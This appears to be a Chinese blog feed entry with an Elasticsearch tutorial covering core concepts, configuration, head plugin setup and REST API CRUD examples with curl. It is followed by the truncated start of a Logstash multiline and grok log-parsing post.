ES是一个基于Lucene实现的开源、分布式、基于Restful风格的全文本搜索引擎；此外，它还是一个分布式实时文档存储，其中每个文档的每个field均是被索引的数据，且可被搜索：也是一个带实时分析功能的分布式搜索引擎，能够扩展至数以百计的节点实时处理PB级的数据。\n1.1 elasticsearch基本组件 索引（index）：文档容器，换句话说，索引是具有类似属性的文档的集合。类似于表。索引名必须使用小写字母：\n类型（type）：类型是索引内部的逻辑分区，其意义完全取决于用户需求。一个索引内部可定义一个或多个类型。一般来说，类型就是拥有相同的域的文档的预定义。\n文档（document）：文档是Lucene索引和搜索的原子单位，它包含了一个或多个域。是域的容器：基于J50N格式表示。每个域的组成部分：一个名字，一个或多个值；拥有多个值的域，通常称为多值域：\n映射（mapping）：原始内容存储为文档之前需要事先进行分析，例如切词、过滤掉某些词等：映射用于定义此分析机制该如何实现；除此之外，ES还为映射提供了诸如将域中的内容排序等功能。\n1.2 es的集群组件 cluster: es的集群标识为集群名称：默认“elasticsearch”。节点就是靠此名字来决定加入到哪个集群中。一个节点只能属性于一个集群。\nNode：运行了单个es实例的主机即为节点。用于存储数据、参与集群索引及搜索操作。节点的标识靠节点名。\nShard：将索引切割成为的物理存储组件：但每一个shard都是一个独立且完整的索引；创建索引时，ES默认将其分割为5个shard，用户也可以按需自定义，创建完成之后不可修改。\nshard有两种类型：primary shard和replica。replica用于数据冗余及查询时的负载均衡。每个主shard的副本数量可自定义，且可动态修改。\n1.3 es的工作过程 es节点启动时默认通过多播方式或单播方式在TCP协议的9300端口查找同一集群中的其他节点，并与之建立通讯。判断是否为同一集群的标准为集群名称，集群中的所有节点会选举出一个主节点负责管理整个集群状态，以及在集群范围内决定各shared的分布方式。站在用户使用中角度而言，每个节点都可以接收并相应各类请求，无需区分哪个为主节点。\n当集群中某一节点为down状态时，主节点会读取集群状态信息，并启动修复过程。此过程中主节点会检查所有可用shared的主shared，并确定主shared是否存在。各种shared及对应副本shared是否对数。此时集群状态会转换为yellow。\nes集群有三种状态：green、red（不可用）、yellow（修复状态）。\n当某状态为down的节点上存在主shared，此时需要从各副本shared中找一个提升为主shared。在yellow状态时，各副本shared均处于未分配模式。此时各个副本都不可用，只能使用主shared。集群虽可基于各组shared进行查询，但此时吞吐能力有限。yellows属于残破不全状态。\n接下来的过程中，主节点将会查找所有的冗余shard，并将其配置为主shared。如果某shared的副本数量少于配置参数的数量，会自动启动复制过程，并为其建立副本shared。直至所有条件都满足从yellow转换至green。\nes工作过程中主节点会周期性检查各节点是否处于可用状态，任意节点不可用时，修复模式都会启动，此时集群将会进入重新均衡过程。\n2 安装elasticsearch 下载地址：http://www.elastic.co/cn/downloads/elasticsearch\n官方文档中写明对es每个版本对jdk的要求。\nhttps://www.elastic.co/guide/en/elasticsearch/reference/current/index.html\n2.1 常用es配置文件说明 修改配置文件：/etc/elasticsearch/elasticsearch.yml\ncluster.name: test1 #←集群名称，同一网段下可以有多个集群，通过名称区分不同的集群。\rnode.name: node-1 #←节点名\rnode.master: true #←是否有资格被选举成为node\rnode.data: true\r# es5中已废弃\rindex.number_of_shards: 5 #←默认索引分片个数，默认为5片。\rindex.number_of_replicas: 1\t#←默认索引副本个数，默认为1个副本\rpath.conf: /path/to/conf #←文件的存储路径\rpath.data: /path/to/data #←索引数据的存储路径，多个存储路径，用逗号隔开\rpath.work: /path/to/work #←日志文件的存储路径\rpath.plugins: /path/to/plugins #←插件的存放路径\rnetwork.bind_host: 192.168.0.1 #←绑定的ip地址 network.publish_host: 192.168.0.1 #←设置其它节点和该节点交互的ip地址\rnetwork.host: 192.168.0.1 #←同时设置bind_host和publish_host\rtransport.tcp.port: 9300 #←节点之间交互的tcp端口，默认是9300。\rhttp.port: 9200 #←设置对外服务的http端口，默认为9200。\rtransport.tcp.compress: true #←设置是否压缩tcp传输时的数据，默认false不压缩\rhttp.max_content_length: 100mb #←内容的最大容量，默认100mb\rhttp.enabled: false #←使用http协议对外提供服务，默认为true开启。\r#←默认为local即为本地文件系统，可以设置为本地文件系统，\r# 分布式文件系统，hadoop的HDFS，和amazon的s3服务器等。\rgateway.type: local gateway.expected_nodes: 2 #←集群中节点的数量，默认为2。\rdiscovery.zen.ping.timeout: 3s #←自动发现其它节点时ping连接超时时间，默认为3秒\tdiscovery.zen.ping.multicast.enabled: false #←打开多播发现节点，默认是true。\r# 设置集群中master节点的初始列表，可以通过这些节点来自动发现新加入集群的节点。\rdiscovery.zen.ping.unicast.hosts: [\u0026quot;host1\u0026quot;, \u0026quot;host2:port\u0026quot;, \u0026quot;host3[portX-portY]\u0026quot;]\r# 当你无法关闭系统的swap的时候，建议把这个参数设为true。\r# 防止在内存不够用的时候，elasticsearch的内存被交换至交换区，导致性能骤降\rbootstrap.mlockal1: true\r参考：https://www.cnblogs.com/hanyouchun/p/5163183.html 修改启动脚本设置启动参数： /usr/share/elasticsearch/bin/elasticsearch\nexport JAVA_HOME=/usr/local/jdk\rexport PATH=$JAVA_HOME/bin:$PATH\res2.x支持方式\nexport ES_HEAP_SIZE=256m\res5.x支持方式\n$ cat /etc/elasticsearch/jvm.options -Xms128m\r-Xmx128m\r2.2 安装head插件 官方网站：https://github.com/mobz/elasticsearch-head#running-with-built-in-server\n对于elasticsearch2.x\nelasticsearch/bin/plugin install file:///root/elasticsearch-head.zip\r对于Elasticsearch 5.x，head不支持网站插件。作为独立服务器运行。 https://www.cnblogs.com/alice626/p/6206722.html\nhttps://www.cnblogs.com/xing901022/p/6030296.html\nhttps://www.cnblogs.com/valor-xh/p/6293689.html\nhttps://github.com/mobz/elasticsearch-head，github上下载压缩包。\n因为head为独立启动的，所以随便放置任意目录即可。\n2.2.1 安装node.js https://nodejs.org/en/download/\n解压后设置环境变量\nexport NODE_HOME=/usr/local/node-v6.9.1-linux-x64 export PATH=$PATH:$NODE_HOME/bin\r检查环境变量\n$ node -v\rv8.11.2\r$ npm -v\r5.6.0\r2.2.2 安装grunt npm install grunt-cli\r$ grunt -version\rgrunt-cli v1.2.0\r2.2.3 修改head配置 head/Gruntfile.js，增加hostname属性，设置为*\nconnect: { server: { options: { port: 9100, hostname: '*', base: '.', keepalive: true } } }\r修改连接地址 head/_site/app.js\nthis.base_uri = this.config.base_uri || this.prefs.get(\u0026quot;app-base_uri\u0026quot;) || \u0026quot;http://10.0.0.12:19200\u0026quot;;\r2.2.4 运行head 在head目录下，执行npm install 下载以来的包：\nnmp install\r出现如下报错\nPlease report this full log at https://github.com/Medium/phantomjs\rnpm ERR! Darwin 15.0.0\rnpm ERR! argv \u0026quot;/usr/local/bin/node\u0026quot; \u0026quot;/usr/local/bin/npm\u0026quot; \u0026quot;install\u0026quot;\rnpm ERR! node v4.4.3\rnpm ERR! npm v3.10.9\rnpm ERR! code ELIFECYCLE\rnpm ERR! phantomjs-prebuilt@2.1.14 install: `node install.js`\rnpm ERR! Exit status 1\rnpm ERR! npm ERR! Failed at the phantomjs-prebuilt@2.1.14 install script 'node install.js\r解决方法\nnpm install phantomjs-prebuilt@2.1.14 --ignore-scripts\r运行head\ngrunt server \u0026amp;\r设置http对外提供服务\n2.3 安装bigdesk https://github.com/hlstudio/bigdesk\n下载bigdesk\n$ cd bigdesk-master\r$ ll\rbigdesk_es2.png\rLICENSE\rNOTICE\rplugin-descriptor.properties\rREADME.md\r【_site】\r进入_site目录\npython -m SimpleHTTPServer port 8000\rmarven、kopf\n2.x plugin 访问 9200/_plugin/head\n3 ES使用 3.1 es api介绍 elasticsearch支持的是Restful风格的API接口\nrestuful介绍： http://www.ruanyifeng.com/blog/2014/05/restful_api.html?bsh_bid=516759003\n四类API：\n检查集群、节点、索引等健康与否，以及获取其相应状态。 管理集群、节点、索引及元数据。 执行CRUD操作。 执行高级操作，例如paging,filtering等。 3.2 es api使用 E5访问接口：tcp/9200\ncurl -X [VERB] [PROTOCOL]://HOST:PORT/[PATH]?[QUERY_STR] -d '\u0026lt;BODY\u0026gt;'\rVERB：GET,PUT,DELETE等。 PROTOCOL：http,https。 QUERY_STRING：查询参数，例如？pretty表示用易读的JSON格式输出。 BODY：请求的主体。 3.2.1 查看es工作状态 $ curl http://10.0.0.12:19200/?pretty\r{\r\u0026quot;name\u0026quot; : \u0026quot;node-1\u0026quot;,\r\u0026quot;cluster_name\u0026quot; : \u0026quot;test1\u0026quot;,\r\u0026quot;version\u0026quot; : {\r\u0026quot;number\u0026quot; : \u0026quot;2.0.0\u0026quot;,\r\u0026quot;build_hash\u0026quot; : \u0026quot;de54438d6af8f9340d50c5c786151783ce7d6be5\u0026quot;,\r\u0026quot;build_timestamp\u0026quot; : \u0026quot;2015-10-22T08:09:48Z\u0026quot;,\r\u0026quot;build_snapshot\u0026quot; : false,\r\u0026quot;lucene_version\u0026quot; : \u0026quot;5.2.1\u0026quot;\r},\r\u0026quot;tagline\u0026quot; : \u0026quot;You Know, for Search\u0026quot;\r}\r查看集群工作状态，?v查看详细信息。\n$ curl 127.0.0.1:19200/_cat/nodes?v\rip heap.percent ram.percent cpu load_1m load_5m load_15m node.role master name\r10.0.0.9 27 90 1 0.07 0.03 0.05 mdi - node-1\r10.0.0.12 46 91 0 0.00 0.01 0.05 mdi * node-2\rhealth：查看当前集群健康状态的相关信息\n$ curl 127.0.0.1:19200/_cat/health?pretty\r1526839934 02:12:14 test green 2 2 0 0 0 0 0 0 - 100.0%\r$ curl 127.0.0.1:19200/_cat/health?v\repoch timestamp cluster status node.total node.data shards pri relo init unassign pending_tasks max_task_wait_time active_shards_percent\r1526841115 02:31:55 test green 2 2 0 0 0 0 0 0 - 100.0%\r3.2.2 自定义查询 $ curl 127.0.0.1:19200/_cat/nodes?h=ip,name,port,uptime,heap.current\r10.0.0.9 node-1 19300 40.7m 107.2mb mdi\r10.0.0.12 node-2 19300 57m 89.6mb mdi\r$ curl 127.0.0.1:19200/_cat/master?v id host ip node\rCorsR-_VSN2YHj5DCRXiKg 10.0.0.12 10.0.0.12 node-2\r官方文档：https://www.elastic.co/guide/en/elasticsearch/reference/6.2/index.html\n3.2.3 state api curl 127.0.0.1:19200/_cluster/state/nodes?pretty\r{\r\u0026quot;cluster_name\u0026quot; : \u0026quot;test\u0026quot;,\r\u0026quot;compressed_size_in_bytes\u0026quot; : 276,\r\u0026quot;nodes\u0026quot; : {\r\u0026quot;cplyIE3WS3a4sKRhjYQPoQ\u0026quot; : {\r\u0026quot;name\u0026quot; : \u0026quot;node-1\u0026quot;,\r\u0026quot;ephemeral_id\u0026quot; : \u0026quot;axJ2wLcZRxyMMfLP7J54HA\u0026quot;,\r\u0026quot;transport_address\u0026quot; : \u0026quot;10.0.0.9:19300\u0026quot;,\r\u0026quot;attributes\u0026quot; : { }\r},\r\u0026quot;CorsR-_VSN2YHj5DCRXiKg\u0026quot; : {\r\u0026quot;name\u0026quot; : \u0026quot;node-2\u0026quot;,\r\u0026quot;ephemeral_id\u0026quot; : \u0026quot;UTGxkPRYSRO_wU_URX_taw\u0026quot;,\r\u0026quot;transport_address\u0026quot; : \u0026quot;10.0.0.12:19300\u0026quot;,\r\u0026quot;attributes\u0026quot; : { }\r}\r}\r}\rcurl 127.0.0.1:19200/_cluster/state/nodes?pretty curl 127.0.0.1:19200/_nodes/state?pretty https://www.elastic.co/guide/en/elasticsearch/reference/6.2/cluster-state.html\n3.3 crud api 3.3.1 创建索引 curl -X PUT -H \u0026quot;Content-Type: application/json\u0026quot; http://127.0.0.1:19200/students/NO/1?pretty -d '\r{\r\u0026quot;first_name\u0026quot;: \u0026quot;jing\u0026quot;,\r\u0026quot;last_name\u0026quot; : \u0026quot;guo\u0026quot;,\r\u0026quot;gender\u0026quot; : \u0026quot;male\u0026quot;,\r\u0026quot;age\u0026quot; :\u0026quot;25\u0026quot;,\r\u0026quot;courses\u0026quot;: \u0026quot;xianglong shiba zhang\u0026quot;\r}'\r{\r\u0026quot;_index\u0026quot; : \u0026quot;students\u0026quot;,\r\u0026quot;_type\u0026quot; : \u0026quot;NO\u0026quot;,\r\u0026quot;_id\u0026quot; : \u0026quot;1\u0026quot;,\r\u0026quot;_version\u0026quot; : 1,\r\u0026quot;result\u0026quot; : \u0026quot;created\u0026quot;,\r\u0026quot;_shards\u0026quot; : {\r\u0026quot;total\u0026quot; : 2,\r\u0026quot;successful\u0026quot; : 1,\r\u0026quot;failed\u0026quot; : 0\r},\r\u0026quot;_seq_no\u0026quot; : 0,\r\u0026quot;_primary_term\u0026quot; : 1\r}\r'{\r\u0026quot;first_name\u0026quot;: \u0026quot;rong\u0026quot;,\r\u0026quot;last_name\u0026quot; : \u0026quot;huang\u0026quot;,\r\u0026quot;gender\u0026quot; : \u0026quot;female\u0026quot;,\r\u0026quot;age\u0026quot; :23,\r\u0026quot;courses\u0026quot;: \u0026quot;luoying shenjian zhang\u0026quot;\r}'\rcurl -XGET http://127.0.0.1:19200/students/NO/1?pretty\r{\r\u0026quot;_index\u0026quot; : \u0026quot;students\u0026quot;,\r\u0026quot;_type\u0026quot; : \u0026quot;NO\u0026quot;,\r\u0026quot;_id\u0026quot; : \u0026quot;1\u0026quot;,\r\u0026quot;_version\u0026quot; : 2,\r\u0026quot;found\u0026quot; : true,\r\u0026quot;_source\u0026quot; : {\r\u0026quot;first_name\u0026quot; : \u0026quot;rong\u0026quot;,\r\u0026quot;last_name\u0026quot; : \u0026quot;huang\u0026quot;,\r\u0026quot;gender\u0026quot; : \u0026quot;female\u0026quot;,\r\u0026quot;age\u0026quot; : 23,\r\u0026quot;courses\u0026quot; : \u0026quot;luoying shenjian zhang\u0026quot;\r}\r}\r3.3.2 更新文档 curl -X POST -H \u0026quot;Content-Type: application/json\u0026quot; http://127.0.0.1:19200/students/NO/1/_update?pretty -d '{\r\u0026quot;doc\u0026quot;: { \u0026quot;age\u0026quot;: 18 }\r}'\r{\r\u0026quot;_index\u0026quot; : \u0026quot;students\u0026quot;,\r\u0026quot;_type\u0026quot; : \u0026quot;NO\u0026quot;,\r\u0026quot;_id\u0026quot; : \u0026quot;1\u0026quot;,\r\u0026quot;_version\u0026quot; : 3,\r\u0026quot;result\u0026quot; : \u0026quot;updated\u0026quot;,\r\u0026quot;_shards\u0026quot; : {\r\u0026quot;total\u0026quot; : 2,\r\u0026quot;successful\u0026quot; : 1,\r\u0026quot;failed\u0026quot; : 0\r},\r\u0026quot;_seq_no\u0026quot; : 2,\r\u0026quot;_primary_term\u0026quot; : 1\r}\r3.3.3 删除文档 curl -X DELETE http://10.0.0.12:19200/students/NO/1?pretty\r{\r\u0026quot;_index\u0026quot; : \u0026quot;students\u0026quot;,\r\u0026quot;_type\u0026quot; : \u0026quot;NO\u0026quot;,\r\u0026quot;_id\u0026quot; : \u0026quot;1\u0026quot;,\r\u0026quot;_version\u0026quot; : 4,\r\u0026quot;result\u0026quot; : \u0026quot;deleted\u0026quot;,\r\u0026quot;_shards\u0026quot; : {\r\u0026quot;total\u0026quot; : 2,\r\u0026quot;successful\u0026quot; : 2,\r\u0026quot;failed\u0026quot; : 0\r},\r\u0026quot;_seq_no\u0026quot; : 3,\r\u0026quot;_primary_term\u0026quot; : 2\r}\r3.3.4 删除索引 curl http://10.0.0.12:19200/_cat/indices\rgreen open test1 cBL6BqIqStyr2a8O2n8Bdw 5 1 0 0 2.5kb 1.2kb\rgreen open students g04VDxTUTEOLmdooHuuRpA 5 1 1 0 26.5kb 13.2kb\rcurl -X DELETE http://10.0.0.12:19200/test1\r{\u0026quot;acknowledged\u0026quot;:true}\rcurl http://10.0.0.12:19200/_cat/indices\rgreen open students g04VDxTUTEOLmdooHuuRpA 5 1 1 0 26.5kb 13.2kb\r3.4 查询数据 Query API Query DSL:JS0N based language for building complex queries。\n用户实现诸多类型的查询操作，比如，simple term query,phrase,range boolean,fuzzy等：\nES的查询操作执行分为两个阶段：\n分散阶段： 合并阶段： 列出一个索引的所有文档，较小级别时的演示说明\ncurl http://10.0.0.12:19200/_search?pretty\r{\r\u0026quot;took\u0026quot; : 15, #←执行时长\r\u0026quot;timed_out\u0026quot; : false, #←是否超时\r\u0026quot;_shards\u0026quot; : { #←操作设计到多少个分片\r\u0026quot;total\u0026quot; : 5,\r\u0026quot;successful\u0026quot; : 5,\r\u0026quot;skipped\u0026quot; : 0,\r\u0026quot;failed\u0026quot; : 0\r},\r\u0026quot;hits\u0026quot; : { #←查询结果\r\u0026quot;total\u0026quot; : 2,\r\u0026quot;max_score\u0026quot; : 1.0,\r\u0026quot;hits\u0026quot; : [\r{\r\u0026quot;_index\u0026quot; : \u0026quot;students\u0026quot;,\r\u0026quot;_type\u0026quot; : \u0026quot;NO\u0026quot;,\r\u0026quot;_id\u0026quot; : \u0026quot;2\u0026quot;,\r\u0026quot;_score\u0026quot; : 1.0, #←文档平分，没有加权\r\u0026quot;_source\u0026quot; : {\r\u0026quot;first_name\u0026quot; : \u0026quot;jing\u0026quot;,\r\u0026quot;last_name\u0026quot; : \u0026quot;guo\u0026quot;,\r\u0026quot;gender\u0026quot; : \u0026quot;male\u0026quot;,\r\u0026quot;age\u0026quot; : \u0026quot;25\u0026quot;,\r\u0026quot;courses\u0026quot; : \u0026quot;xianglong shiba zhang\u0026quot;\r}\r},\r{\r\u0026quot;_index\u0026quot; : \u0026quot;students\u0026quot;,\r\u0026quot;_type\u0026quot; : \u0026quot;NO\u0026quot;,\r\u0026quot;_id\u0026quot; : \u0026quot;1\u0026quot;,\r\u0026quot;_score\u0026quot; : 1.0,\r\u0026quot;_source\u0026quot; : {\r\u0026quot;first_name\u0026quot; : \u0026quot;rong\u0026quot;,\r\u0026quot;last_name\u0026quot; : \u0026quot;huang\u0026quot;,\r\u0026quot;gender\u0026quot; : \u0026quot;female\u0026quot;,\r\u0026quot;age\u0026quot; : 23,\r\u0026quot;courses\u0026quot; : \u0026quot;luoying shenjian zhang\u0026quot;\r}\r}\r]\r}\r}\r默认情况下，只返回前十个。\ncurl -H 'content-type: application/json' http://10.0.0.12:19200/_search?pretty -d '{\r\u0026quot;query\u0026quot;: {\u0026quot;match_all\u0026quot;: {}}\r}'\r3.5 多索引、多类型查询 /_search：所有索引： /INDEX_NAME/_search：单索引： /INDEX1,INDEX2/_search：多索引： /s*,t*/_search： /students/class1/_search：单类型搜索 /students/class1,class2/_search：多类型搜索\n3.6 插入测试数据 curl -H 'content-type: application/json' \\\rhttp://10.0.0.12:19200/test1/NO/1?pretty -d '{\r\u0026quot;name\u0026quot;:\u0026quot;zhou yu\u0026quot;,\r\u0026quot;age\u0026quot;: \u0026quot;25\u0026quot;,\r\u0026quot;weapon\u0026quot;: \u0026quot;duan jian\u0026quot;\r}'\rcurl -H 'content-type: application/json' \\\rhttp://10.0.0.12:19200/test1/NO/2?pretty -d '{\r\u0026quot;name\u0026quot;:\u0026quot;zhangliang\u0026quot;,\r\u0026quot;age\u0026quot;: 31,\r\u0026quot;weapon\u0026quot;: \u0026quot;fu zhou\u0026quot;\r}'\rcurl -H 'content-type: application/json' \\\rhttp://10.0.0.12:19200/test1/NO/3?pretty -d '{\r\u0026quot;name\u0026quot;:\u0026quot;zhang liao\u0026quot;,\r\u0026quot;age\u0026quot;: \u0026quot;31\u0026quot;,\r\u0026quot;weapon\u0026quot;: \u0026quot;dao\u0026quot;\r}'\rcurl -H 'content-type: application/json' \\\rhttp://10.0.0.12:19200/test1/NO/4?pretty -d '{\r\u0026quot;name\u0026quot;:\u0026quot;zhang fei\u0026quot;,\r\u0026quot;age\u0026quot;: \u0026quot;30\u0026quot;,\r\u0026quot;weapon\u0026quot;: \u0026quot;zhang ba she mao\u0026quot;\r}'\rcurl -H 'content-type: application/json' \\\rhttp://10.0.0.12:19200/test1/NO/5?pretty -d '{\r\u0026quot;name\u0026quot;: \u0026quot;zhu ge liang\u0026quot;,\r\u0026quot;age\u0026quot;: \u0026quot;18\u0026quot;,\r\u0026quot;weapon\u0026quot;: \u0026quot;yu shan\u0026quot;,\r\u0026quot;intro\u0026quot;: \u0026quot;31 years old\u0026quot;\r}'\r可以看出，默认按照字符串匹配。文档中的每个域存储为特定类型而非字符串。\n{ \u0026quot;hits\u0026quot;: { \u0026quot;total\u0026quot;: 3, \u0026quot;max_score\u0026quot;: 0.87546873, \u0026quot;hits\u0026quot;: [ { \u0026quot;_index\u0026quot;: \u0026quot;test1\u0026quot;, \u0026quot;_type\u0026quot;: \u0026quot;NO\u0026quot;, \u0026quot;_id\u0026quot;: \u0026quot;3\u0026quot;, \u0026quot;_score\u0026quot;: 0.87546873, \u0026quot;_source\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;zhang liao\u0026quot;, \u0026quot;age\u0026quot;: \u0026quot;31\u0026quot;, \u0026quot;weapon\u0026quot;: \u0026quot;dao\u0026quot; } }, { \u0026quot;_index\u0026quot;: \u0026quot;test1\u0026quot;, \u0026quot;_type\u0026quot;: \u0026quot;NO\u0026quot;, \u0026quot;_id\u0026quot;: \u0026quot;2\u0026quot;, \u0026quot;_score\u0026quot;: 0.87546873, \u0026quot;_source\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;zhangliang\u0026quot;, \u0026quot;age\u0026quot;: 31, \u0026quot;weapon\u0026quot;: \u0026quot;fu zhou\u0026quot;\r} } ,\r{ \u0026quot;_index\u0026quot;: \u0026quot;test1\u0026quot;, \u0026quot;_type\u0026quot;: \u0026quot;NO\u0026quot;, \u0026quot;_id\u0026quot;: \u0026quot;5\u0026quot;, \u0026quot;_score\u0026quot;: 0.2876821, \u0026quot;_source\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;zhu ge liang\u0026quot;, \u0026quot;age\u0026quot;: \u0026quot;18\u0026quot;, \u0026quot;weapon\u0026quot;: \u0026quot;yu shan\u0026quot;, \u0026quot;intro\u0026quot;: \u0026quot;31 years old\u0026quot; } } ] } 指定域搜索做精确匹配\n\u0026quot;hits\u0026quot;: [ { \u0026quot;_index\u0026quot;: \u0026quot;test1\u0026quot;, \u0026quot;_type\u0026quot;: \u0026quot;NO\u0026quot;, \u0026quot;_id\u0026quot;: \u0026quot;3\u0026quot;, \u0026quot;_score\u0026quot;: 0.87546873, \u0026quot;_source\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;zhang liao\u0026quot;, \u0026quot;age\u0026quot;: \u0026quot;31\u0026quot;, \u0026quot;weapon\u0026quot;: \u0026quot;dao\u0026quot; } } , { \u0026quot;_index\u0026quot;: \u0026quot;test1\u0026quot;, \u0026quot;_type\u0026quot;: \u0026quot;NO\u0026quot;, \u0026quot;_id\u0026quot;: \u0026quot;4\u0026quot;, \u0026quot;_score\u0026quot;: 0.87546873,\r\u0026quot;_source\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;zhang fei\u0026quot;, \u0026quot;age\u0026quot;: \u0026quot;30\u0026quot;, \u0026quot;weapon\u0026quot;: \u0026quot;zhang ba she mao\u0026quot; } } ]\r查看指定类型的mapping示例 curl \u0026ldquo;http://10.0.0.12:19200/test1/_mapping/NO?pretty\u0026rdquo; mapping定义了整个文档中的数据是被当做何种类型对待的。\n{\r\u0026quot;test1\u0026quot; : {\r\u0026quot;mappings\u0026quot; : {\r\u0026quot;NO\u0026quot; : {\r\u0026quot;properties\u0026quot; : {\r\u0026quot;age\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;text\u0026quot;,\r\u0026quot;fields\u0026quot; : {\r\u0026quot;keyword\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;keyword\u0026quot;,\r\u0026quot;ignore_above\u0026quot; : 256\r}\r}\r},\r\u0026quot;intro\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;text\u0026quot;,\r\u0026quot;fields\u0026quot; : {\r\u0026quot;keyword\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;keyword\u0026quot;,\r\u0026quot;ignore_above\u0026quot; : 256\r}\r}\r},\r\u0026quot;name\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;text\u0026quot;,\r\u0026quot;fields\u0026quot; : {\r\u0026quot;keyword\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;keyword\u0026quot;,\r\u0026quot;ignore_above\u0026quot; : 256\r}\r}\r},\r\u0026quot;weapon\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;text\u0026quot;,\r\u0026quot;fields\u0026quot; : {\r\u0026quot;keyword\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;keyword\u0026quot;,\r\u0026quot;ignore_above\u0026quot; : 256\r}\r}\r}\r}\r}\r}\r}\r}\rES中搜索的数据广义上可被理解为两类：\ntypes:exact full-text 精确值：指未经加工的原始值；在搜索时进行精确匹配。NOTEBOOK≠notebook\nfull-text：用于引用文本中数据；判断文档在多大程序上匹配查询请求；即评估文档与用户请求查询的相关度。\n为了完成ful1-text搜素，ES必须首先分析文本，并创建出倒排素引：倒排素引中的数据还需进行“正规化”为标准格式：如全部小写、负数变为单数、trees改为tree等。\n创建倒排索引需要先分词再normalization。分词加正规化的操作及为分析。\n分析需要由分析器(analyzer)进行。分析器由三个组件构成：字符过滤器、分词器、分词过滤器。\nES内置的分析器：\nStandard analyzer：ES的默认分析器，适用于多种语言，基于Unicode方式进行分析。 Simple analyzer：简单分析器，根据所有的字母进行分析。 Wirtespace analyzer：只把空白字符当做单词分割。 Language analyzer：为多种语言分别提供各种各样的分析器。 分析器不仅在创建素引时用到；在构建查询时也会用到。构建索引时的分析器，分析用户查询并构建成查询语句的分词方式。两种方式需要保持一致。\n[2018-09-21 05:24:03,381][INFO ][cluster.routing.allocation.decider] [node-1] low disk watermark [85%] exceeded on [JWxQxMkeTj6BkmIx-6DsXg][node-1][/var/lib/elasticsearch/my-application/nodes/0] free: 1gb[11.2%], replicas will not be assigned to this node\n4 ES错误 ES索引yellow状态 查看片状态\ncurl 172.16.16.18:9200/_cat/shards\rlogstash-webapi-2018.10.30 0 p STARTED 1 6.1kb 127.0.0.1 6wPQIP5\rlogstash-webapi-2018.10.30 0 p STARTED 3 16.4kb 127.0.0.1 6wPQIP5\rlogstash-webapi-2018.10.30 0 r UNASSIGNED logstash-webapi-2018.10.30 0 p STARTED 1824 1mb 127.0.0.1 6wPQIP5\rlogstash-webapi-2018.10.30 0 p UNASSIGNED\rlogstash-webapi-2018.10.30 0 p STARTED 272 363.4kb 127.0.0.1 6wPQIP5\rlogstash-webapi-2018.10.30 0 p UNASSIGNED\rlogstash-webapi-2018.10.30 0 p STARTED 0 5.1kb 127.0.0.1 6wPQIP5\rlogstash-webapi-2018.10.30 0 p UNASSIGNED\rlogstash-webapi-2018.10.30 0 p STARTED 4888 2.4mb 127.0.0.1 6wPQIP5\rlogstash-webapi-2018.10.30 0 p UNASSIGNED yellow表示所有主分片可用，但不是所有副本分片都可用，最常见的情景是单节点时，由于es默认是有1个副本，主分片和副本不能在同一个节点上，所以副本就是未分配unassigned\nPUT 172.16.16.18:9200/logstash -d '\r{\r\u0026quot;settings\u0026quot;:{\r\u0026quot;number_of_shards\u0026quot;:1, \u0026quot;number_of_replicas\u0026quot;:0\r}\r}'\r参考网址：elasticsearch集群健康为黄色\n","permalink":"https://www.oomkill.com/2018/11/es/","summary":"","title":"elasticsearch安装"},{"content":"Java日志多由多行行组成，初始行之后的每一行以空格开头，如下例所示：在这种情况下，需要在将事件数据output之前处理多行事件。\n[ERROR] - 2018-09-21 04:19:57.685 (SocketTransfer.java:73) - Socket交互遇到错误\rException in thread \u0026quot;main\u0026quot; java.lang.NullPointerException\rat com.example.myproject.Book.getTitle(Book.java:16)\rat com.example.myproject.Author.getBookTitles(Author.java:25)\rat com.example.myproject.Bootstrap.main(Bootstrap.java:14)\r配置multiline参数如下：Multiline codec plugin\n参数 说明 pattern 指定正则表达式。与指定正则表达式匹配的行被视为前一行的延续或新多行事件的开始。 what previous或next。该previous值指定与pattern选项中的值匹配的行是上一行的一部分。该next值指定与pattern选项中的值匹配的行是以下行的一部分 negate true或false（默认为false）。如果true，与pattern模式不匹配的消息将构成多行过滤器的匹配what并将应用。 input {\rfile {\rpath =\u0026gt; \u0026quot;/root/apache-tomcat-8.5.34/logs/catalina.out\u0026quot;\rtype =\u0026gt; \u0026quot;sk\u0026quot;\rstart_position =\u0026gt; \u0026quot;beginning\u0026quot;\rcodec =\u0026gt; multiline {\rpattern =\u0026gt; \u0026quot;^\\[\u0026quot;\rnegate =\u0026gt; \u0026quot;true\u0026quot;\rwhat =\u0026gt; \u0026quot;previous\u0026quot;\r}\r}\r}\r如上列日志格式为\n[日志级别] - 日期 java类 - 错误报错\r一般情况下，我们不需要将对其grok，因grok会大量影响性能。如上列格式需要对每一列进行grok\n# 日期 TESTTIME %{YEAR}\\-%{MONTHNUM}\\-%{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND}\r根据以上格式写出如下的正则\nfilter {\rgrok {\rmatch =\u0026gt; {\r'message' =\u0026gt; \u0026quot;\\[\\s?%{LOGLEVEL:lev}\\] - %{TESTTIME:date}\\s+\\((?\u0026lt;\\class\u0026gt;.*\\.java\\:\\d+)\\)\\s\\-\\s(?\u0026lt;\\msg\u0026gt;.*)\u0026quot;\r}\r}\rmutate { remove_field =\u0026gt; \u0026quot;message\u0026quot;\r}\r}\r匹配到的日志格式\n{\r\u0026quot;@timestamp\u0026quot; =\u0026gt; \u0026quot;2018-10-05T13:16:27.263Z\u0026quot;,\r\u0026quot;@version\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;,\r\u0026quot;path\u0026quot; =\u0026gt; \u0026quot;/root/apache-tomcat-8.5.34/logs/catalina.out\u0026quot;,\r\u0026quot;host\u0026quot; =\u0026gt; \u0026quot;node02\u0026quot;,\r\u0026quot;type\u0026quot; =\u0026gt; \u0026quot;sk\u0026quot;,\r\u0026quot;lev\u0026quot; =\u0026gt; 